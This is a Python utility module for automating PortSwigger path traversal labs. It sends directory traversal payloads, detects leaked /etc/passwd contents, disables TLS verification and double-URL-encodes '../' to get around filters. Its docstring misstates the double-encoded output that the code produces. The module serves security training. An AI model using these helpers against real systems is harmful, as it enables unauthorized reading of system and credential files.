# path_traversal_utils.py — shared utilities for Path Traversal lab automation scripts
#
# Mirrors all prior utils files in structure and naming conventions.
# Import in each lab script with:
#   from path_traversal_utils import banner, section, make_session, ...

import re
import requests


def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║      PortSwigger — Path Traversal Lab Automation Suite       ║
║      Directory Traversal & File Read Vulnerabilities         ║
╚══════════════════════════════════════════════════════════════╝
""")


def section(title):
    width = 64
    print(f"\n{'─' * width}")
    print(f"  {title}")
    print(f"{'─' * width}\n")


def make_session(proxies=None):
    """
    Return a requests.Session with TLS verification disabled and optional proxy.

    TLS verification is disabled because Burp Suite uses a self-signed
    certificate for its HTTPS interception proxy.
    """
    s = requests.Session()
    s.verify = False
    if proxies:
        s.proxies = proxies
    return s


def looks_like_passwd_file(text):
    """
    Check whether a response body looks like the contents of /etc/passwd.
    The classic signature is a line starting with 'root:' followed by
    a colon-separated structure.
    """
    return bool(re.search(r'^root:.*:0:0:', text, re.MULTILINE))


def try_traversal_payload(session, base_url, endpoint, param_name, payload, label=None):
    """
    Send a single traversal payload as a GET query parameter and report
    whether the response looks like a successful /etc/passwd read.

    Returns the response object.
    """
    label = label or payload
    r = session.get(f"{base_url}{endpoint}", params={param_name: payload})

    success = looks_like_passwd_file(r.text)
    status = "✔" if success else "✘"
    print(f"  {status}  [{r.status_code}] {label}")

    return r


def print_step(msg):
    """Print a single instructional step."""
    print(f"  ➜  {msg}")


def print_box(title, content):
    """
    Print a clearly bordered block — used for showing leaked file contents
    or exploit details.
    """
    bar = "─" * 60
    print(f"\n  ┌─── {title} {bar[:max(0, 52 - len(title))]}┐")
    for line in str(content).strip().split("\n"):
        print(f"  │  {line}")
    print(f"  └{bar}┘\n")


def double_url_encode(traversal_sequence):
    """
    Double URL-encode a traversal sequence (e.g. '../') for labs where the
    application strips raw traversal sequences BEFORE decoding, but then
    performs an additional decode step of its own after validation.

    First encode:  ../  ->  %2e%2e%2f
    Second encode: %2e%2e%2f -> %25%32%65%25%32%65%25%32%66

    We build this manually (rather than calling urllib.parse.quote twice)
    to make the transformation fully explicit and auditable.
    """
    single_encoded = "".join(f"%{ord(c):02x}" for c in traversal_sequence)
    double_encoded = single_encoded.replace("%", "%25")
    return double_encoded
